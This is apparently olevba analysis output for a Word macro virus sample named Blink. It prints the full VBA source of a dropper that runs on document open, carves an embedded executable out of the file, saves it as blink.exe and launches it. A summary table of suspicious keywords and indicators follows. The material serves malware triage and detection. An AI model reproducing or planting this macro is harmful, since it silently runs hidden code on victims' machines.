olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Blink
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Blink - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Blink.bas 
in file: Virus.MSWord.Blink - OLE stream: 'Macros/VBA/Blink'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function OpenFile Lib "kernel32" Alias "_lopen" (ByVal s As String, ByVal mode As Long) As Long
Private Declare Function CreateFile Lib "kernel32" Alias "_lcreat" (ByVal s As String, ByVal attr As Long) As Long
Private Declare Function GlobalAlloc Lib "kernel32" (ByVal fl As Long, ByVal n As Long) As Long
Private Declare Sub CopyFileA Lib "kernel32" (ByVal src As String, ByVal dst As String, ByVal mode As Long)
Private Declare Sub SeekFile Lib "kernel32" Alias "_llseek" (ByVal h As Long, ByVal ofs As Long, ByVal fw As Long)
Private Declare Sub ReadFile Lib "kernel32" Alias "_lread" (ByVal h As Long, ByVal ptr As Long, ByVal n As Long)
Private Declare Sub WriteFile Lib "kernel32" Alias "_lwrite" (ByVal h As Long, ByVal ptr As Long, ByVal n As Long)
Private Declare Sub CloseFile Lib "kernel32" Alias "_lclose" (ByVal h As Long)

Sub autoOpen()
On Error Resume Next
'BLiNK by ULTRAS[MATRiX]
Dim doc As String, exe As String
Dim h As Long, p As Long
doc = "blink.doc"
exe = "blink.exe"
CopyFileA ActiveDocument.FullName, doc, 0
p = GlobalAlloc(0, 8192)
h = OpenFile(doc, 0)
SeekFile h, 29696, 0
ReadFile h, p, 8192
CloseFile h
h = CreateFile(exe, 0)
WriteFile h, p, 8192
CloseFile h
Shell "blink.exe", 4
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Lib                 |May run code from a DLL                      |
|IOC       |blink.exe           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

